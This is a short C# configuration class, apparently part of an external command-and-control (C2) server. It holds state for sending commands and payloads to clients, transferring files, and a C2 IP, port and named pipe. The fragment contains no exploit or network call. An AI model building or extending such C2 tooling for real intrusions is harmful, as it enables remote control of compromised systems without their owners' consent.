using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using ExternalC2;

namespace Server
{
    internal class Options
    {
        internal static string command = "header";
        internal static string md5 = ""; //获取CMD5值
        internal static string flag = "false";  //指示客户端是否接受命令
        internal static uint SN = 0; //0表示命令 1指示文件传输
        //internal static List<string> recDate = new List<string> { }; //接受传回的数据
        internal static Dictionary<int, string> sendPayload = new Dictionary<int, string>();
        internal static Queue<string> sendDate = new Queue<string> { };
        internal static SortedList<int, string> recDate = new SortedList<int, string>();
        internal static string c2ip = "";
        internal static string c2port = "";
        internal static string pipeName = "sxfnb";
        internal static SocketC2 socketC2;
    }
}
